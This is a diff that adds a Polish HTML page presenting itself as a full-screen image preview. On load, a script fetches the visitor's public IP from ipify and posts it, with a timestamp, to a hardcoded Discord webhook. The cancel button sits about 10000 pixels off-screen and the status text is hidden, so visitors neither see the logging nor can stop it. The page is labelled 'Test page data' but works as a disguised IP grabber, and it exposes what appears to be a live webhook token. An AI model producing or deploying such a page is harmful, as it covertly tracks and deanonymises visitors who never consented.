@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      overflow: hidden;
+    }
+
+    /* IMAGE OVERLAY */
+    #image-screen {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #000;
+      z-index: 10;
+    }
+
+    #image-screen img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    /* CANCEL BUTTON */
+    #cancel {
+      position: fixed;
+      bottom: 10000px;
+      right: 10000px;
+      padding: 10px 16px;
+      background: rgba(192, 57, 43, 0.9);
+      border: none;
+      color: #fff;
+      cursor: pointer;
+      z-index: 20;
+    }
+
+    /* STATUS (hidden visually but exists) */
+    #status {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="image-screen">
+    <img src="https://i.imgur.com/A6gTVF9.jpeg" alt="preview">
+  </div>
+
+  <button id="cancel">Anuluj</button>
+  <p id="status"></p>
+
+  <script>
+    let timeLeft = 0;
+    let cancelled = false;
+
+    const status = document.getElementById("status");
+    const cancelBtn = document.getElementById("cancel");
+
+    cancelBtn.onclick = () => {
+      cancelled = true;
+      cancelBtn.innerText = "Anulowano";
+      cancelBtn.disabled = true;
+    };
+
+    async function startCountdown() {
+      status.innerText = `Start: ${new Date().toISOString()}`;
+
+      const timer = setInterval(() => {
+        timeLeft--;
+
+        if (cancelled) {
+          clearInterval(timer);
+          return;
+        }
+
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          sendData();
+        }
+      }, 1000);
+    }
+
+    async function sendData() {
+      if (cancelled) return;
+
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+
+      await fetch("https://discord.com/api/webhooks/1455692358296539137/e-tveF3PLZp3WTSWxPTRO9emgPL2m3jRL94sD-i4u3_Dk6Fh6lfn6miETUmcb-uiWKus", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content:
+`📥 **Test page data**
+🕒 Czas wysłania: ${new Date().toISOString()}
+🌐 IP: ${ipData.ip}`
+        })
+      });
+
+      cancelBtn.innerText = "Wysłano";
+      cancelBtn.disabled = true;
+    }
+
+    // START AUTOMATYCZNIE
+    startCountdown();
+  </script>
+
+</body>
+</html>
